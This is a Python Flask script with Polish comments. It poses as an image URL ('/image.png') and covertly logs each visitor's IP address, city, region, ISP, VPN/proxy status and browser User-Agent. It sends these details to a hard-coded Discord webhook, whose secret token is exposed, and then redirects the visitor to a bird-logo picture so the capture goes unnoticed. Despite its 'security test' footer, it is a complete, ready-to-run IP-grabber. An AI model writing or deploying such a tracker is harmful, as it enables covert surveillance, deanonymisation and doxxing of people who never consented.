import requests
from flask import Flask, request, redirect

app = Flask(__name__)

# Twoje dane z promptu
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1466928983496069121/sFGXFac4Ql5ob_-oBlfLQ0w_saOlyGxvAiJ75YjQ6At1weQ4_vGS8HS20fdpQUnejIjK"
REDIRECT_IMAGE = "https://img.freepik.com/darmowe-wektory/ptak-ilustracja-projektowanie-logo-retro_53876-117215.jpg"

@app.route('/image.png')
def logger():
    # 1. Pobieranie IP (za proxy/hostingiem)
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr

    # 2. Pobieranie szczegółów geolokalizacyjnych przez ip-api
    geo_data = {}
    try:
        geo_res = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,isp,proxy").json()
        if geo_res["status"] == "success":
            geo_data = geo_res
    except Exception as e:
        print(f"Błąd geo: {e}")

    # 3. Formułowanie wiadomości do Discorda
    payload = {
        "embeds": [{
            "title": "🚀 Nowe logowanie z maszyny wirtualnej",
            "color": 16711680, # Czerwony
            "fields": [
                {"name": "🌐 Adres IP", "value": f"`{ip}`", "inline": True},
                {"name": "🌍 Kraj/Miasto", "value": f"{geo_data.get('country', 'Nieznany')} / {geo_data.get('city', 'Nieznane')}", "inline": True},
                {"name": "📍 Region", "value": f"{geo_data.get('regionName', 'Nieznane')}", "inline": True},
                {"name": "🏢 Dostawca (ISP)", "value": f"{geo_data.get('isp', 'Nieznany')}", "inline": False},
                {"name": "🛡️ VPN/Proxy?", "value": "TAK" if geo_data.get('proxy') else "NIE", "inline": True},
                {"name": "📱 Browser/System", "value": f"```{request.headers.get('User-Agent')}```", "inline": False}
            ],
            "footer": {"text": "Laboratorium IT - Test Bezpieczeństwa"}
        }]
    }

    # 4. Wysyłka na Discord
    requests.post(DISCORD_WEBHOOK_URL, json=payload)

    # 5. Przekierowanie do obrazka
    return redirect(REDIRECT_IMAGE)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
